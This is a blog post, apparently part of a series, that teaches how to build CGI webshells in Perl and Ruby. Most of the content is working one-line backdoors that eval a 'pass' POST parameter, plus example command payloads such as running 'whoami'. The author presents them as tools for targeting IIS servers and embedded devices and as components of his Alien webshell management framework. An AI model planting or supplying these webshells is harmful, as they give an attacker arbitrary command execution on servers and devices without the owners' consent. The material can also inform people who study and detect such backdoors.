@@ -1,0 +1,289 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learning] Inside Different Generations of WebShells (Part 2: CGI WebShells) | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learning] Inside Different Generations of WebShells (Part 2: CGI WebShells)</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-07-19T16:58:28.000Z" id="date"> 2026-07-20</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-07-20T15:19:21.857Z" id="updated"> 2026-07-20</time></div></span><br><span>Word Count: <div class="control">995</div></span><br><span>Read Time: <div class="control">6 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of the <strong>Inside Different Generations of WebShells</strong> series.</p>
+<p>In the previous article, <a href="https://iss4cf0ng.github.io/2026/07/20/2026-7-20-Webshell-Part1/">Inside Different Generations of WebShells (Part 1: Understanding WebShells)</a>, I introduced the concept and design philosophy of OneShells.</p>
+<p>In this article, I will discuss how CGI webshells can be implemented using Perl and Ruby. These techniques can be applied when targeting Microsoft IIS servers as well as embedded devices that expose CGI-based web interfaces.</p>
+<p align="center" class='item-img' data-src='/images/meme/Rio/1.png'><img src="/images/meme/Rio/1.png" width=250/>
+</p>
+
+<h1 id="What-Is-CGI"><a href="#What-Is-CGI" class="headerlink" title="What Is CGI?"></a>What Is CGI?</h1><p>CGI stands for Common Gateway Interface. It is a standard that allows a web server to execute external programs or scripts in response to an HTTP request. Instead of serving only static files, a CGI-enabled web server can run applications written in languages such as Perl, Ruby, C, or shell scripts to process user input, interact with databases or hardware, and generate dynamic web content.</p>
+<h1 id="Applications-of-CGI"><a href="#Applications-of-CGI" class="headerlink" title="Applications of CGI"></a>Applications of CGI</h1><p>On a Microsoft Internet Information Services (IIS) server, CGI enables IIS to launch external executables or scripts to handle web requests.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/1.png'><img src="/images/article/2026-7-20-Webshell-2/1.png" width=700/>
+</p>
+
+<p>Although CGI is considered a legacy technology in many modern enterprise environments, it is still widely used in embedded systems and network-connected devices. Many routers, industrial controllers, NAS devices, IP cameras, printers, and IoT products still rely on CGI programs to implement their web management interfaces.</p>
+<h1 id="CGI-OneShells"><a href="#CGI-OneShells" class="headerlink" title="CGI OneShells"></a>CGI OneShells</h1><p>As I mentioned in the previous article, the essential philosophy of OneShells is arbitrary code execution. Once arbitrary code execution is achieved, the entire server can be compromised.</p>
+<p>Fortunately (or unfortunately), both Perl and Ruby provide the powerful <code>eval()</code> function.</p>
+<h2 id="Perl-OneShells"><a href="#Perl-OneShells" class="headerlink" title="Perl OneShells"></a>Perl OneShells</h2><p>Nowadays, Perl is far less popular than Python. In addition, Perl also predates Python by several years. (Many security researchers probably have not written Perl code since analyzing the leaked NSA toolset.)</p>
+<p>In a CGI environment, a Perl script generates the response, beginning with HTTP headers (such as <code>Content-Type</code>) followed by the response body (HTML, JSON, plain text, or another supported format).</p>
+<p>In other words, <code>Content-Type</code> has to be printed first.</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Content-Type: text/html\n\n&quot;</span>;<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;html&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;body&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;/body&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;/html&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/2.png'><img src="/images/article/2026-7-20-Webshell-2/2.png" width=700/>
+</p>
+
+<p>After reading the Perl CGI documentation (<a target="_blank" rel="noopener" href="https://perldoc.perl.org/5.8.9/CGI">PerlDoc</a>), implementing an HTTP POST handler is actually straightforward:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> CGI;<br><br><span class="hljs-keyword">my</span> <span class="hljs-variable">$cgi</span> = CGI-&gt;new;<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Content-Type: text/html\n\n&quot;</span>;<br><br><span class="hljs-keyword">my</span> <span class="hljs-variable">$name</span> = <span class="hljs-variable">$cgi</span>-&gt;param(<span class="hljs-string">&#x27;name&#x27;</span>);<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello, <span class="hljs-variable">$name</span>\n&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>HTTP POST request:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">name=iss4cf0ng<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/3.png'><img src="/images/article/2026-7-20-Webshell-2/3.png" width=700/>
+</p>
+
+<p>Using the same approach, a Perl OneShell can be implemented as follows:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> CGI;<br><br><span class="hljs-keyword">my</span> <span class="hljs-variable">$cgi</span> = CGI-&gt;new;<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Content-Type: text/html\n\n&quot;</span>;<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cgi</span>-&gt;param(<span class="hljs-string">&#x27;pass&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<p>The POST data below demonstrates how this webshell can be exploited:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=system(&quot;whoami&quot;);<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/4.png'><img src="/images/article/2026-7-20-Webshell-2/4.png" width=700/>
+</p>
+
+<p>Of course, if we want to minimize the OneShell even further, we can remove the <code>print &quot;Content-Type: text/html\n\n&quot;;</code>, but you have to append it at the beginning of the payload. Otherwise, the server returns an HTTP 500 response.</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> CGI;<br><br><span class="hljs-keyword">my</span> <span class="hljs-variable">$cgi</span> = CGI-&gt;new;<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cgi</span>-&gt;param(<span class="hljs-string">&#x27;pass&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=print &quot;Content-Type: text/html\n\n&quot;;system(&quot;whoami&quot;);<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/5.png'><img src="/images/article/2026-7-20-Webshell-2/5.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/6.png'><img src="/images/article/2026-7-20-Webshell-2/6.png" width=700/>
+</p>
+
+<blockquote>
+<p>Note: Alien v5.0.0 currently adopts this approach. However, I plan to make the implementation more customizable in future versions.</p>
+</blockquote>
+<p>At this point, the simplest Perl OneShell can be implemented as follows:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> CGI;<span class="hljs-keyword">eval</span>(CGI-&gt;new-&gt;param(<span class="hljs-string">&#x27;pass&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/7.png'><img src="/images/article/2026-7-20-Webshell-2/7.png" width=700/>
+</p>
+
+<h2 id="Ruby-OneShells"><a href="#Ruby-OneShells" class="headerlink" title="Ruby OneShells"></a>Ruby OneShells</h2><p>Like Perl, Ruby is not as popular as Python. Most security researchers are probably familiar with Ruby because Metasploit is primarily written in Ruby. (If you have worked in penetration testing, chances are that you have already used it.)</p>
+<p>In a CGI environment, Ruby scripts work similarly to Perl scripts, beginning with HTTP headers (such as <code>Content-Type</code>) followed by the response body:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">puts <span class="hljs-string">&quot;Content-Type: text/plain&quot;</span><br>puts<br>puts <span class="hljs-string">&quot;Hello, World!&quot;</span><br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/9.png'><img src="/images/article/2026-7-20-Webshell-2/9.png" width=700/>
+</p>
+
+<p>However, the HTTP POST handler is slightly more complicated than Perl. It seems that Ruby’s CGI library does not provide an interface as convenient as Perl or PHP.</p>
+<p>After some experimentation, I discovered an approach for better compatibility:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby">puts <span class="hljs-string">&quot;Content-Type: text/plain&quot;</span><br>puts<br><br>puts <span class="hljs-string">&quot;Request method: <span class="hljs-subst">#&#123;<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]&#125;</span>&quot;</span><br>puts <span class="hljs-string">&quot;Content length: <span class="hljs-subst">#&#123;<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>]&#125;</span>&quot;</span><br><br>body = <span class="hljs-variable constant_">STDIN</span>.read(<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>].to_i)<br><br>puts <span class="hljs-string">&quot;POST body:&quot;</span><br>puts body<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/10.png'><img src="/images/article/2026-7-20-Webshell-2/10.png" width=700/>
+</p>
+
+<p>Eventually, a Ruby OneShell can be implemented as follows:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;uri&#x27;</span>; <span class="hljs-variable">$_POST</span> = <span class="hljs-variable constant_">URI</span>.decode_www_form(<span class="hljs-variable constant_">STDIN</span>.read(<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>].to_i)).to_h <span class="hljs-keyword">rescue</span> &#123;&#125;; eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]) <span class="hljs-keyword">if</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-7-20-Webshell-2/11.png'><img src="/images/article/2026-7-20-Webshell-2/11.png" width=700/>
+</p>
+
+<blockquote>
+<p><strong>Note:</strong> Alien v5.0.0 currently adopts this implementation. By introducing the global <code>$_POST</code> variable, the development experience becomes very similar to PHP. However, I still plan to make this behavior configurable in future versions.</p>
+</blockquote>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Although Perl and Ruby are very different languages from PHP or ASP.NET, the overall design philosophy remains unchanged. As long as arbitrary code execution can be achieved, the webshell becomes merely a lightweight execution layer, while the actual functionality can be implemented entirely by Alien.</p>
+<p>So far, this series has covered OneShell implementations in PHP, ASP, ASP.NET, Perl and Ruby.</p>
+<p>Although CGI webshells are no longer common in modern enterprise environments, they are still highly relevant when targeting embedded systems, network appliances, and legacy web applications.</p>
+<p>One of the primary goals of Alien is to provide a unified management framework across as many web technologies as possible. Therefore, supporting CGI-based languages such as Perl and Ruby remains worthwhile.</p>
+<p align="center" class='item-img' data-src='/images/meme/Rio/3.png'><img src="/images/meme/Rio/3.png" width=250/>
+</p>
+
+<p>In the next article, I will introduce the design philosophy behind <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/NebulaPulsar">NebulaPulsar</a>, discuss how it integrates with Alien, and explain the engineering challenges involved. Finally, I will introduce <strong>Event Horizon</strong>, the component responsible for obfuscating HTTP traffic generated by OneShells.</p>
+<p>If you have any comments or suggestions, please feel free to leave them below!</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/Wallpaper/Shiroko_ShootingStar.png'><img src="/images/meme/Wallpaper/Shiroko_ShootingStar.png" width=700/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2026/07/20/2026-7-20-Webshell-Part1/">← Next [Learning] Inside Different Generations of WebShells (Part 1: Understanding WebShells)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/07/01/2026-7-1-NebulaPulsar2-0/">NebulaPulsar 2.0: CFM Webshell and New Features Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#What-Is-CGI"><span class="toc-number">2.</span> <span class="toc-text">What Is CGI?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Applications-of-CGI"><span class="toc-number">3.</span> <span class="toc-text">Applications of CGI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CGI-OneShells"><span class="toc-number">4.</span> <span class="toc-text">CGI OneShells</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl-OneShells"><span class="toc-number">4.1.</span> <span class="toc-text">Perl OneShells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby-OneShells"><span class="toc-number">4.2.</span> <span class="toc-text">Ruby OneShells</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">5.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">6.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
